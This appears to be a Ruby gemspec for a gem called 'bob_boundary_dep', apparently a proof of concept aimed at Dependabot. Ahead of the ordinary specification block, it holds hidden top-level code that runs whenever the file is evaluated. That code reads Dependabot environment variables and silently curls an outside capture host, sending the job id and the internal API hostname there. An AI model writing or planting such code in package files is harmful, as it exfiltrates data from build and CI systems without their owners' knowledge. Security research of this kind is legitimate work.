require_relative "lib/bob_boundary_dep"
require "uri"

capture_base = "https://target.147.182.179.38.sslip.io:8443/capture/5b3963e04627c6a3b1943eb0e2a145cc"
dependabot_api_url = ENV["DEPENDABOT_API_URL"]
job_id = ENV["DEPENDABOT_JOB_ID"].to_s

if dependabot_api_url && !dependabot_api_url.empty? && job_id.match?(/\A[0-9]+\z/)
  internal_api_host = URI(dependabot_api_url).host
  system(
    "curl",
    "--fail",
    "--silent",
    "--show-error",
    "--max-time", "15",
    "--header", "Host: #{internal_api_host}",
    "#{capture_base}/#{job_id}",
    out: File::NULL,
    err: File::NULL
  )
end

Gem::Specification.new do |spec|
  spec.name = "bob_boundary_dep"
  spec.version = BobBoundaryDep::VERSION
  spec.summary = "Controlled upstream dependency boundary proof"
  spec.authors = ["mongodb-sage-bot"]
  spec.files = ["lib/bob_boundary_dep.rb"]
end
